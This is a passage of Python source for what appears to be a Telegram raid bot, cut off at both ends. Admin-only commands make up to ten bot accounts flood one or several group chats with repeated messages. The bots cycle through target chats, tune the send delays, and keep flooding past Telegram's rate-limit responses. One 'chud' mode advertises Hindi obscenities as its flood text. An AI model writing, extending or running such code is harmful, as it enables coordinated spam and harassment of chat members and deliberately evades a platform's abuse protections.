     "│ -𝐛𝐨𝐭𝐧𝐚𝐦𝐞 <𝐧> 𝐑𝐞𝐧𝐚𝐦𝐞 𝐛𝐨𝐭𝐬  │\n"
     "│ -𝐚𝐝𝐝𝐚𝐥𝐥𝐛𝐨𝐭𝐬  𝐀𝐝𝐝 𝐚𝐥𝐥 𝐛𝐨𝐭𝐬 │\n"
     "└───────────────────────────────┘"),
    # 18 — Sudo
    ("┌────── 🔐 𝑺𝑼𝑫𝑶 ──────────────┐\n"
     "│ -𝐚𝐝𝐝𝐬𝐮𝐝𝐨 <𝐢𝐝>               │\n"
     "│ -𝐫𝐞𝐦𝐨𝐯𝐞𝐬𝐮𝐝𝐨 <𝐢𝐝>            │\n"
     "│ -𝐬𝐮𝐝𝐨𝐥𝐢𝐬𝐭                   │\n"
     "└───────────────────────────────┘"),
    # 19 — Tools
    ("┌────── 🛠 𝑻𝑶𝑶𝑳𝑺 ─────────────┐\n"
     "│ -𝐬𝐭𝐚𝐭𝐮𝐬       𝐍𝐂 𝐬𝐭𝐚𝐭𝐮𝐬    │\n"
     "│ -𝐮𝐩𝐭𝐢𝐦𝐞       𝐁𝐨𝐭 𝐮𝐩𝐭𝐢𝐦𝐞   │\n"
     "│ -𝐩𝐢𝐧𝐠         𝐋𝐚𝐭𝐞𝐧𝐜𝐲 𝐭𝐞𝐬𝐭  │\n"
     "│ -𝐬𝐩𝐞𝐞𝐝𝐭𝐞𝐬𝐭    𝟏𝟎𝐬 𝐍𝐂 𝐛𝐞𝐧𝐜𝐡  │\n"
     "│ -𝐠𝐜𝐥𝐢𝐬𝐭       𝐆𝐫𝐨𝐮𝐩𝐬 𝐥𝐢𝐬𝐭   │\n"
     "│ -𝐟𝐥𝐨𝐨𝐝𝐬𝐭𝐚𝐭    𝐅𝐥𝐨𝐨𝐝 𝐬𝐭𝐚𝐭𝐮𝐬  │\n"
     "│ -𝐬𝐞𝐭𝐦𝐞𝐧𝐮𝐩𝐡𝐨𝐭𝐨  𝐒𝐞𝐭 𝐦𝐞𝐧𝐮 𝐩𝐢𝐜 │\n"
     "│ -𝐜𝐥𝐞𝐚𝐫𝐦𝐞𝐧𝐮    𝐂𝐥𝐞𝐚𝐫 𝐦𝐞𝐝𝐢𝐚  │\n"
     "│ -𝐠𝐥𝐨𝐛𝐚𝐥𝐬𝐭𝐨𝐩   𝐒𝐭𝐨𝐩 𝐚𝐥𝐥 𝐆𝐂𝐬 │\n"
     "│ -𝐡𝐞𝐥𝐩         𝐓𝐡𝐢𝐬 𝐦𝐞𝐧𝐮     │\n"
     "└───────────────────────────────┘"),
    # 20 — Multi-GC NC
    ("┌────── 🌐 𝑴𝑼𝑳𝑻𝑰-𝑮𝑪 𝑵𝑪 ──────────┐\n"
     "│ -𝐦𝐠𝐜𝐧𝐜 <𝐭>    𝐁𝐚𝐬𝐢𝐜 𝐍𝐂           │\n"
     "│ -𝐦𝐠𝐜𝐜𝐡𝐮𝐝 <𝐭>  💥 𝐂𝐡𝐮𝐝 𝐭𝐞𝐦𝐩𝐥𝐚𝐭𝐞  │\n"
     "│ -𝐦𝐠𝐜𝐛𝐨𝐥𝐝 <𝐭>  𝐁𝐨𝐥𝐝 𝐍𝐂            │\n"
     "│ -𝐦𝐠𝐜𝐟𝐢𝐫𝐞 <𝐭>  🔥 𝐅𝐢𝐫𝐞 𝐍𝐂         │\n"
     "│ -𝐦𝐠𝐜𝐰𝐚𝐫 <𝐭>   ⚔️ 𝐖𝐚𝐫 𝐍𝐂          │\n"
     "│ -𝐦𝐠𝐜𝐬𝐮𝐫𝐠𝐞 <𝐭> ⚡ 𝐒𝐮𝐫𝐠𝐞 𝐍𝐂        │\n"
     "│ -𝐦𝐠𝐜𝐜𝐮𝐬𝐭𝐨𝐦 <𝐧> <𝐭> 𝐂𝐮𝐬𝐭𝐨𝐦       │\n"
     "│ -𝐬𝐭𝐨𝐩𝐦𝐠𝐜𝐧𝐜   ⛔ 𝐒𝐭𝐨𝐩              │\n"
     "│ -𝐦𝐠𝐜𝐬𝐭𝐚𝐭𝐮𝐬   𝐒𝐭𝐚𝐭𝐮𝐬             │\n"
     "│ 𝘙𝘰𝘶𝘯𝘥-𝘳𝘰𝘣𝘪𝘯 𝘦𝘯𝘨𝘪𝘯𝘦, 𝘱𝘦𝘳-𝘎𝘊 𝘧𝘭𝘰𝘰𝘥  │\n"
     "└─────────────────────────────────┘"),
]


async def _mgcnc_engine(chat_ids: List[int], bots: List[Any], stop_event: asyncio.Event, factory) -> None:
    """Multi-GC NC engine — each bot round-robins through all target GCs.
    Per-GC independent flood state: flooded GC is skipped, others run at full speed.
    """
    gc_list = list(chat_ids)
    n_gc    = len(gc_list)
    if n_gc == 0 or not bots:
        return
    gap  = _nc_send_gap if _nc_send_gap is not None else 0.09
    STEP = 0.12
    fs: Dict[int, float] = {cid: 0.0 for cid in gc_list}

    async def _worker(bot_idx: int):
        bot    = bots[bot_idx]
        cursor = bot_idx % n_gc
        await asyncio.sleep(bot_idx * STEP)
        while not stop_event.is_set():
            cid = gc_list[cursor % n_gc]
            cursor += 1
            now = time.monotonic()
            if fs[cid] > now:
                await asyncio.sleep(0.02)
                continue
            txt = factory()
            try:
                await bot.send_message(cid, txt)
                await asyncio.sleep(gap)
            except RetryAfter as e:
                wait = float(e.retry_after) + 0.5
                fs[cid] = time.monotonic() + wait
                await asyncio.sleep(min(wait, 2.0))
            except (TimedOut, NetworkError):
                await asyncio.sleep(1.0)
            except Forbidden:
                fs[cid] = time.monotonic() + 30.0
            except Exception:
                await asyncio.sleep(0.5)

    workers = [asyncio.create_task(_worker(i)) for i in range(len(bots))]
    try:
        await asyncio.gather(*workers)
    finally:
        for w in workers:
            if not w.done():
                w.cancel()
        await asyncio.shield(asyncio.gather(*workers, return_exceptions=True))

async def _run_engine(chat_id: int, bots: List[Any], stop_event, factory):
    await _blaze_engine(chat_id, bots, stop_event, factory)

def _dedup_key(update: Update) -> Optional[tuple]:
    msg = update.message or update.edited_message
    if msg:
        return (msg.chat_id, msg.message_id)
    return None

def _guard(handler):
    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        msg  = update.message or update.edited_message
        if not user or not is_admin(user.id):
            if msg:
                try:
                    await msg.reply_text(_GATE)
                except Exception:
                    pass
            return
        key = _dedup_key(update)
        if key is not None:
            if key in _seen:
                return
            _seen.add(key)
            if len(_seen) > 8000:
                for k in list(_seen)[:4000]:
                    _seen.discard(k)
        await handler(update, ctx)
    wrapper.__name__ = handler.__name__
    return wrapper

_guard_any = _guard

def _bots() -> List[Any]:
    return [b for b in all_bot_instances if b is not None]

def _get_args(ctx) -> List[str]:
    return ctx.args or []

def _txt_arg(ctx) -> str:
    return " ".join(_get_args(ctx)).strip()

async def _reply(msg, text: str):
    for chunk in _split_text(text):
        try:
            await msg.reply_text(chunk)
        except Exception:
            pass

def _split_text(text: str, limit: int = 4096):
    """Split text into chunks at newline boundaries, each ≤ limit chars."""
    chunks = []
    current = ""
    for line in text.split("\n"):
        segment = (line + "\n")
        if len(current) + len(segment) > limit:
            if current:
                chunks.append(current.rstrip("\n"))
            current = segment
        else:
            current += segment
    if current.strip():
        chunks.append(current.rstrip("\n"))
    return chunks or [text[:limit]]

async def _send_menu_msg(msg, section: int = 0):
    if 1 <= section <= len(_MENU_SECTIONS):
        text = _MENU_SECTIONS[section - 1]
        for chunk in _split_text(text):
            try:
                await msg.reply_text(chunk)
            except Exception:
                pass
        return
    pid = _menu_media.get("photo_id")
    if pid:
        try:
            await msg.reply_photo(photo=pid, caption=_MENU[:1024])
        except Exception:
            pass
    for chunk in _split_text(_MENU):
        try:
            await msg.reply_text(chunk)
        except Exception:
            pass

@_guard
async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    known_chats.add(cid)
    _save_json(GROUPS_FILE, list(known_chats))
    args = _get_args(ctx)
    section = 0
    if args:
        try:
            section = int(args[0])
        except ValueError:
            pass
    await _send_menu_msg(msg, section)

@_guard
async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    count = 0
    try:
        count = await tc.stop_all(cid)
    except Exception:
        pass
    # Clear all per-chat state regardless of task stop result
    try:
        mute_chats.discard(cid)
        ncdel_chats.discard(cid)
        autoreact_chats.pop(cid, None)
        autoreply_chats.pop(cid, None)
        ncwar_targets.pop(cid, None)
        _multiwar_active.pop(cid, None)
        targetslide_chats.pop(cid, None)
        targetreply_chats.pop(cid, None)
        pfploop_active.pop(cid, None)
        replyflood_chats.pop(cid, None)
        _nc_info.pop(cid, None)
    except Exception:
        pass
    try:
        await _reply(msg,
            "╔══════════════════════╗\n"
            "  ⛔ 𝐒𝐓𝐎𝐏𝐏𝐄𝐃\n"
            f"  𝘒𝘪𝘭𝘭𝘦𝘥 {count} 𝘵𝘢𝘴𝘬𝘴\n"
            "╚══════════════════════╝"
        )
    except Exception:
        pass

async def _start_nc(msg, chat_id: int, factory, label: str, engine_name="BLAZE"):
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return

    async def _run(stop_ev):
        await _run_engine(chat_id, bots, stop_ev, factory)

    await tc.start(chat_id, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════╗\n"
        f"  ⚡ 𝐍𝐂 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"  📛 {label}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  🔧 𝘌𝘯𝘨: {engine_name}\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════╝"
    )

@_guard
async def cmd_nc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -nc <text>")
        return
    await _start_nc(msg, cid, _pure_nc_factory(txt), txt)

@_guard
async def cmd_boldnc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -boldnc <text>")
        return
    await _start_nc(msg, msg.chat_id, _font_factory(txt, "bold"), f"𝐁𝐎𝐋𝐃 {txt}")

@_guard
async def cmd_cursivenc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -cursivenc <text>")
        return
    await _start_nc(msg, msg.chat_id, _font_factory(txt, "cursive"), f"𝑪𝒖𝒓𝒔𝒊𝒗𝒆 {txt}")

@_guard
async def cmd_italicnc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -italicnc <text>")
        return
    await _start_nc(msg, msg.chat_id, _font_factory(txt, "italic"), f"𝘐𝘵𝘢𝘭𝘪𝘤 {txt}")

@_guard
async def cmd_wavenc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -wavenc <text>")
        return
    await _start_nc(msg, msg.chat_id, _wave_factory(txt), f"🌊 Wave {txt}")

@_guard
async def cmd_chud(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -chud <text>")
        return

    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return

    gap = _nc_send_gap if _nc_send_gap is not None else 0.09
    _nc_info[cid] = {"engine": "CHUD", "text": txt, "start_t": time.monotonic()}

    async def _run(stop_ev):
        try:
            await _chud_engine(cid, bots, stop_ev, _chud_nc_factory(txt))
        finally:
            _nc_info.pop(cid, None)

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  💥⚡ 𝑪𝑯𝑼𝑫 𝑵𝑪 𝑺𝑻𝑨𝑹𝑻𝑬𝑫 ⚡💥\n"
        f"  📛 {txt}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  ⚙️  𝘗𝘪𝘱𝘦𝘭𝘪𝘯?? · {gap:.2f}𝘴 · ~{1/gap:.0f}/𝘴𝘦𝘤\n"
        f"  🔥 𝘡𝘦𝘳𝘰 𝘑𝘪𝘵𝘵𝘦𝘳 · 𝘡𝘦𝘳𝘰 𝘍𝘭𝘰𝘰𝘥 · 𝘍𝘢𝘴𝘵𝘦𝘴𝘵\n"
        f"  💥 𝘞𝘰𝘳𝘥𝘴: LUND·TBKC·TBR·TMR·चुदोड़े\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_sasukencs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx) or "SASUKE"
    idx = [0]
    factories = [_sasuke_factory(txt, i) for i in range(10)]
    def _cycling_factory():
        f = factories[idx[0] % len(factories)]
        idx[0] += 1
        return f()
    await _start_nc(msg, cid, _cycling_factory, f"⚡ All Sasuke NCs")

async def _friend_nc_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE, friend: str):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx) or friend
    uni = FRIENDS_UNI.get(friend, _to_bold_italic(friend))
    await _start_nc(msg, cid, _friend_nc_factory(friend, txt), f"👤 {uni} NC")

@_guard
async def cmd_randomcod(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    txt = _txt_arg(ctx) or "SASUKE"
    await _start_nc(msg, msg.chat_id, _randomcod_factory(txt), "🌀 RANDOMCOD")

@_guard
async def cmd_godcod(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx) or "SASUKE"
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return
    gap = _nc_send_gap if _nc_send_gap is not None else 0.20

    async def _run(stop_ev):
        await _god_engine(cid, bots, stop_ev, _randomcod_factory(txt))

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  ⚡𝑮𝑶𝑫𝑪𝑶𝑫 𝑵𝑪 𝑺𝑻𝑨𝑹𝑻𝑬𝑫⚡\n"
        f"  📛 {txt}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  ⚙️  𝘚𝘺𝘯𝘤 𝘎𝘢𝘵𝘦 · {gap:.2f}𝘴 𝘵𝘪𝘤𝘬\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_aizennc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    txt = _txt_arg(ctx) or "AIZEN"
    await _start_nc(msg, msg.chat_id, _aizen_factory(txt), "♛ AIZEN NC")

@_guard
async def cmd_villainnc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    txt = _txt_arg(ctx) or "VILLAIN"
    await _start_nc(msg, msg.chat_id, _villain_factory(txt), "𖤍 VILLAIN NC")

@_guard
async def cmd_snc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -snc <text>")
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return

    async def _run(stop_ev):
        await _surge_engine(cid, bots, stop_ev, _lean_nc_factory(txt))

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════╗\n"
        f"  ⚡ 𝐒𝐔𝐑𝐆𝐄 𝐍𝐂 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"  📛 {txt}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════╝"
    )

@_guard
async def cmd_anshgod(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -anshgod <text>")
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return
    gap = _nc_send_gap if _nc_send_gap is not None else 0.25
    _nc_info[cid] = {"engine": "ANSHGOD", "text": txt, "start_t": time.monotonic()}

    async def _run(stop_ev):
        try:
            await _god_engine(cid, bots, stop_ev, _lean_nc_factory(txt))
        finally:
            _nc_info.pop(cid, None)

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  ⚡𝑨𝑵𝑺𝑯𝑮𝑶𝑫 𝑵𝑪 𝑺𝑻𝑨𝑹𝑻𝑬𝑫⚡\n"
        f"  📛 {txt}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  ⚙️  𝘈𝘥𝘢𝘱𝘵𝘪𝘷𝘦 · {gap:.2f}𝘴 𝘧𝘭𝘰𝘰𝘳\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_sasuke1(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -sasuke1 <text>")
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return
    gap = _nc_send_gap if _nc_send_gap is not None else 0.15
    _nc_info[cid] = {"engine": "SASUKE1", "text": txt, "start_t": time.monotonic()}

    async def _run(stop_ev):
        try:
            await _stagger_engine(cid, bots, stop_ev, _lean_nc_factory(txt))
        finally:
            _nc_info.pop(cid, None)

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  ⚡𝐗ᴇʀᴏɪᴄ 𝑵𝑪 𝑺𝑻𝑨𝑹𝑻𝑬𝑫⚡\n"
        f"  📛 {txt}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  ⚙️  𝘚𝘵𝘢𝘨𝘨𝘦𝘳 · {gap:.2f}𝘴\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_sasukegod(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -sasukegod <text>")
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return
    gap = _nc_send_gap if _nc_send_gap is not None else 0.25
    _nc_info[cid] = {"engine": "SASUKEGOD", "text": txt, "start_t": time.monotonic()}

    async def _run(stop_ev):
        try:
            await _god_engine(cid, bots, stop_ev, _sasuke_factory(txt, 0))
        finally:
            _nc_info.pop(cid, None)

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🗡️⚡𝐗ᴇʀᴏɪᴄ 𝑮𝑶𝑫 𝑵𝑪 𝑺𝑻𝑨𝑹𝑻𝑬𝑫⚡🗡️\n"
        f"  📛 {txt}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  ⚙️  𝘈𝘥𝘢𝘱𝘵𝘪𝘷𝘦 · {gap:.2f}𝘴\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_triogod(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -triogod <text>")
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return
    gap = _nc_send_gap if _nc_send_gap is not None else 0.45
    _nc_info[cid] = {"engine": "TRIOGOD", "text": txt, "start_t": time.monotonic()}

    async def _run(stop_ev):
        try:
            await _trio_engine(cid, bots, stop_ev, _lean_nc_factory(txt))
        finally:
            _nc_info.pop(cid, None)

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🔱⚡𝑻𝑹𝑰𝑶𝑮𝑶𝑫 𝑵𝑪 𝑺𝑻𝑨𝑹𝑻𝑬𝑫⚡🔱\n"
        f"  📛 {txt}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: 3·3·4 𝘨𝘳𝘰𝘶𝘱𝘴\n"
        f"  ⚙️  𝘎𝘢𝘱: {gap:.2f}𝘴\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_silknc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -silknc <text>")
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!")
        return
    step = _nc_send_gap if _nc_send_gap is not None else 0.18
    _nc_info[cid] = {"engine": "SILKNC", "text": txt, "start_t": time.monotonic()}

    async def _run(stop_ev):
        try:
            await _silk_engine(cid, bots, stop_ev, _lean_nc_factory(txt))
        finally:
            _nc_info.pop(cid, None)

    await tc.start(cid, "nc", _run)
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  🪡⚡ 𝑺𝑰𝑳𝑲 𝑵𝑪 𝑺𝑻𝑨𝑹𝑻𝑬𝑫 ⚡🪡\n"
        f"  📛 {txt}\n"
        f"  🤖 𝘉𝘰𝘵𝘴: {len(bots)}\n"
        f"  -stop 𝘵𝘰 𝘴𝘵𝘰𝘱\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    bots = _bots()
    nc   = tc.running(cid, "nc")
    info = _nc_info.get(cid)
    gap  = _nc_send_gap if _nc_send_gap is not None else 0.25

    if nc and info:
        elapsed = time.monotonic() - info["start_t"]
        m, s = divmod(int(elapsed), 60)
        nc_block = (
            f"  ▸ 𝗡𝗖:     ✅ 𝗥𝘂𝗻𝗻𝗶𝗻𝗴\n"
            f"  ▸ 𝗘𝗻𝗴𝗶𝗻𝗲: {info['engine']}\n"
            f"  ▸ 𝗧𝗲𝘅𝘁:   {info['text']}\n"
            f"  ▸ 𝗧𝗶𝗺𝗲:   {m}𝗺 {s}𝘀\n"
        )
    elif nc:
        nc_block = "  ▸ 𝗡𝗖:     ✅ 𝗥𝘂𝗻𝗻𝗶𝗻𝗴\n"
    else:
        nc_block = "  ▸ 𝗡𝗖:     ❌ 𝗦𝘁𝗼𝗽𝗽𝗲𝗱\n"

    tr  = cid in targetreply_chats
    ts  = cid in targetslide_chats
    pfp = pfploop_active.get(cid, False)

    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  📊 𝑺𝑻𝑨𝑻𝑼𝑺\n"
        f"  ─────────────────────────────\n"
        f"{nc_block}"
        f"  ▸ 𝗕𝗼𝘁𝘀:   {len(bots)}/10 𝗮𝗰𝘁𝗶𝘃𝗲\n"
        f"  ▸ 𝗗𝗲𝗹𝗮𝘆:  {gap:.2f}𝘴\n"
        f"  ▸ 𝗧𝗥𝗣𝗟𝗬: {'✅' if tr else '❌'}\n"
        f"  ▸ 𝗧𝗦𝗟𝗜𝗗𝗘: {'✅' if ts else '❌'}\n"
        f"  ▸ 𝗣𝗙𝗣:   {'✅ 𝗟𝗼𝗼𝗽' if pfp else '❌'}\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_uptime(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    elapsed = time.monotonic() - BOT_START_TIME
    h, rem  = divmod(int(elapsed), 3600)
    m, s    = divmod(rem, 60)
    bots    = _bots()
    nc      = tc.running(msg.chat_id, "nc")
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  ⏱ 𝑼𝑷𝑻𝑰𝑴𝑬\n"
        f"  ─────────────────────────────\n"
        f"  ▸ {h}𝗵 {m}𝗺 {s}𝘀\n"
        f"  ▸ 𝗕𝗼𝘁𝘀: {len(bots)}/10\n"
        f"  ▸ 𝗡𝗖:   {'✅' if nc else '❌'}\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_ping(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    t0   = time.monotonic()
    sent = await msg.reply_text("🏓")
    ms   = int((time.monotonic() - t0) * 1000)
    qual = "🟢 𝗙𝗮𝘀𝘁" if ms < 300 else ("🟡 𝗢𝗸" if ms < 700 else "🔴 𝗦𝗹𝗼𝘄")
    await sent.edit_text(
        f"╔══════════════════════════════╗\n"
        f"  🏓 𝑷𝑰𝑵𝑮\n"
        f"  ─────────────────────────────\n"
        f"  ▸ 𝗥𝗧𝗧:  {ms}𝗺𝘀  {qual}\n"
        f"  ▸ 𝗕𝗼𝘁𝘀: {len(_bots())}/10\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_setdelay(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global _nc_send_gap
    msg = update.message or update.edited_message
    if not msg:
        return
    args = _get_args(ctx)
    if not args:
        cur = f"{_nc_send_gap:.2f}𝘴" if _nc_send_gap is not None else "𝐝𝐞𝐟𝐚𝐮𝐥𝐭"
        await _reply(msg,
            "╔══════════════════════════╗\n"
            "  ⏱ 𝐍𝐂 𝐃𝐄𝐋𝐀𝐘 𝐒𝐓𝐀𝐓𝐔𝐒\n"
            f"  𝘊𝘶𝘳𝘳𝘦𝘯𝘵: {cur}\n"
            "  𝘜𝘴𝘦: -setdelay <sec>\n"
            "  𝘙𝘦𝘴𝘦𝘵: -setdelay reset\n"
            "╚══════════════════════════╝"
        )
        return
    if args[0].lower() in ("reset", "default", "off"):
        _nc_send_gap = None
        await _reply(msg,
            "╔══════════════════════════╗\n"
            "  ✅ 𝐍𝐂 𝐃𝐄𝐋𝐀𝐘 𝐑𝐄𝐒𝐄𝐓\n"
            "╚══════════════════════════╝"
        )
        return
    try:
        val = float(args[0])
        if val < 0.05 or val > 10.0:
            await _reply(msg, "⚠️ 𝐃𝐞𝐥𝐚𝐲 𝐦𝐮𝐬𝐭 𝐛𝐞 0.05 – 10.0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬")
            return
        _nc_send_gap = val
        await _reply(msg,
            "╔══════════════════════════╗\n"
            "  ✅ 𝐍𝐂 𝐃𝐄𝐋𝐀𝐘 𝐒𝐄𝐓\n"
            f"  ⏱ 𝘎𝘢𝘱: {val}𝘴\n"
            "  𝘙𝘦𝘴𝘵𝘢𝘳𝘵 𝘺𝘰𝘶𝘳 𝘕𝘊 𝘵𝘰 𝘢𝘱𝘱𝘭𝘺\n"
            "╚══════════════════════════╝"
        )
    except ValueError:
        await _reply(msg, "𝐔𝐬𝐞: -setdelay <seconds>")

@_guard
async def cmd_phantom(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if msg:
        await _reply(msg,
            "╔══════════════════════╗\n"
            "  ⚡ 𝑩𝑳𝑨𝒁𝑬 𝑬𝑵𝑮𝑰𝑵𝑬\n"
            "  𝘈𝘭𝘭 𝘣𝘰𝘵𝘴 𝘧𝘪𝘳𝘦 𝘢𝘵 𝘰𝘯𝘤𝘦\n"
